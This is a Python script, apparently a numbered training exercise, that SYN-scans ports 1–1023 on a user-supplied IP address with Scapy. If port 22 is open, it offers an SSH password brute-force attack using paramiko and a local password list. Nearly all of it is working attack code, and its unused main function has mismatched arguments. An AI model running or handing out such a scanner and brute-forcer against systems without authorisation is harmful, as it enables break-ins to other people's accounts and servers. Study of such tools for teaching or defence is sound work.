# 1.1 Make sure you have a Scapy library installed.
# 1.2 Import everything from scapy.all.
# 4.1 Import paramiko
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
import paramiko
import time

x = '''
  _____    _    _   _____    ______  _____              _   _               
 |  __ \  | |  | | |  __ \  |___  / |_   _|     /\     | \ | |              
 | |__) | | |  | | | |  | |    / /    | |      /  \    |  \| |  _ __  _   _ 
 |  ___/  | |  | | | |  | |   / /     | |     / /\ \   | . ` | | '_ \| | | |
 | |      | |__| | | |__| |  / /__   _| |_   / ____ \  | |\  |_| |_) | |_| |
 |_|       \____/  |_____/  /_____| |_____| /_/    \_\ |_| \_(_) .__/ \__, |
                                                               | |     __/ |
                                                               |_|    |___/                                                           
'''

y = '''
               #((/**                             
              %&##/(//**/.                        
             %%&&#//**,,,,,*/                     
             /&&%*%&(/*****,,,.                   
             %//***((#(((((//*,*                  
                          %%/**,*                 
                           /%#/*,/                
                            .%#(*,*.              
                             %##/*,*(             
                              %#(/*,,/            
***///,                      *%%((/*,,*,          
*,*,,,,,,*/.                 #%%#((/*,,*(         
,,,,,,,******/   /,*/,       #&&#(((/*,,*(        
....,,*///////********,**/   /&&&##(/***,*/       
.,,**/((((//**/**,,,,,,,,**(#&@@&#((//*,**/       
,***(##((####((((////*,,,,**((%@&%#(/***,**(      
*/(&&##&%%&#((//(/////**,,***////%#((//***//      
(((((###%%%%%##(/*****,**********////*//////(     
***/(    #%####%##(////*******/************///    
**//         *########((((//((((((((//***//(#     
///   


'''

z = "simple network scanner with shh brute force attack"

print (y)
print (z)
print (x)
print ('''instructions:
    1. Enter an ip adress in order to scan for open ports.
    2. If port 22 is open, select y for brute force attack
    3. input name of account to attack the target

    ''')

# 1.3 Create variable called "target" with user input
target = input("1. Enter ip addres in order to scan for open ports: ")

# 1.4 Create variable that is equal to range of 1 to 1023 for registered ports
port_range = range(1, 1024)

# 1.5 Create empty list for open ports
open_ports = []

# 1.6 Create a function to check if a port is open
def check_port(port):
    # 1.8 Generate a random source port
    src_port = RandShort()

    # 1.9 Set Scapy to quiet mode
    conf.verb = 0

    # 1.10 Create a SYN packet and send it
    syn_packet = sr1(IP(dst=target) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5)

    # 1.11 Check if packet exists
    if syn_packet is None:
        return False

    # 1.12 Check if packet has a TCP layer
    elif not syn_packet.haslayer(TCP):
        return False

    # 1.13 Check if SYN-ACK flag is set
    elif syn_packet.haslayer(TCP) and syn_packet.getlayer(TCP).flags == 0x12:
        # 1.14 Send an RST flag to close the connection and return True
        rst_packet = sr(IP(dst=target) / TCP(sport=src_port, dport=port, flags="R"), timeout=2)
        open_ports.append(port)
        return True
    else:
        return False

    return open_ports

# 1.7 Loop through the port range and call the check_port function for each port
for port in port_range:
    if check_port(port):
        print("[+][+][+] Port {} is open[+][+][+]".format(port))
    else:
        print("[-] Port {} is closed".format(port))

# 1.15 Print the list of open ports
print("Those Ports are open:", open_ports)




# 2.1 Create function that check target availability.
def check_availability(target):
    try:
        # 2.2 Perform "try" and "except", while the except catches the Exception as a variable.
        # 2.3 Print the exception and return False.
        # 2.4 In try: set the conf.verb to 0.
        conf.verb = 0
        # 2.5 Create a variable that sends an ICMP to the target with a timeout of 3, using the command sr1(IP(dst = target)/ICMP(),timeout = 3).
        response = sr1(IP(dst=target)/ICMP(), timeout=3)
        if response:
            # 2.6 If the ping succeeded return True.
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False
    

# 3 create a main function
def main():
    
    # 3.1 check if target is available
    if check_availability(target):
        
        open_ports = check_port(22)
        
        # 3.2 loop over ports range
        for port_range in range(1, 1024):
            # 3.3 create a status variable
            status = check_port(target, port)
            
            # 3.4 if port is open, print and append to list
            if status:
                print(f"Port {port} is open!")
                open_ports.append(port)
        
        # 3.5 after the loop print "finished scanning""
        print("Finished scanning!")
        
    else:
        # if target is unavailable print it
        print(f"{target} isn't available.")

# 4.14 After Main functionality loop under the "Finished scanning" 
# print create another if statement that checks if 22 is in the open ports list variable.
if 22 in open_ports:
    print ("SSH brute force attack option available")


# 4.2 Create a function that takes one parameter: port called brute_force
def brute_force(port):

    # 4.3 sing the "with" method open the "PasswordList.txt"
    # 4.4 Create inside the "with" assign to a "passwords" list variable each line as a value.
    with open("PasswordList.txt") as f:
        passwords = [line.strip() for line in f.readlines()]

    # 4.5 User input variable
    user = input("3. Enter the SSH username: ")

    # 4.6 create SSHcon variable
    # 4.7 ssh missing host key policy
    SSHconn = paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # 4.8 Create a loop for each value in the "passwords" variable.
    # 4.9 Create try and except, while the except prints "<password> failed".
    # 4.10 Connect to SSH using "SSHconn.connect(<target IP>, port=int(<targets open ssh port>),username=user, password=password,timeout = 1)".
    # 4.11 Print the password with a success message.
    # 4.12 Close the connection with "SSHconn.close()".
    # 4.13 Break the loop.

    for password in passwords:
        try:
            SSHconn.connect(target, port=int(port), username=user, password=password, timeout=5)
            print(f"[+][+][+] [>]Password found!:{password}[<] [+][+][+]")
            SSHconn.close()
            break
        except:
            print(f"[-] {password} is an invalid password")
            time.sleep(3)
            continue

# 4.15 if port 22 is on the list variable, ask the user if he wants to brute-force the SSH port.
# 4.16 If the answer is "y" or "Y", start the brute force function while sending it the port as the argument.
if 22 in open_ports:
    brute_force_answer = input("2. Would you like to brute force attack the SSH port? (y/n): ")
    if brute_force_answer.lower() in ["y", "Y", "yes", "Yes"]:
        brute_force(22)
